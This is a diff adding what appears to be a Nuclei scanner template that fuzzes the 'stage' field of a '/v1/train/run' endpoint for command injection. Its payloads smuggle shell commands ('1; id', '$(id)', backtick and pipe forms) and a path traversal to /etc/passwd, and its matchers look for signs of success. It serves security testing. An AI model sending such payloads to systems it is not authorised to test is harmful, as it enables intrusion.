@@ -1,0 +1,30 @@
+id: bhajanlal-train-run-cmdi
+info:
+  name: Bhajanlal /v1/train/run command injection fuzz
+  author: bhajanlal
+  severity: high
+  description: Fuzzes stage/dry_run fields for command injection in training trigger.
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/v1/train/run"
+    headers:
+      Content-Type: application/json
+    body: '{"dry_run": false, "stage": "{{stage}}"}'
+    payloads:
+      stage:
+        - "1; id"
+        - "1 && whoami"
+        - "$(id)"
+        - "`id`"
+        - "1 | id"
+        - "../../../etc/passwd"
+    attack: battering-ram
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "root:"
+          - "started"
+        condition: or
+    matchers-condition: or
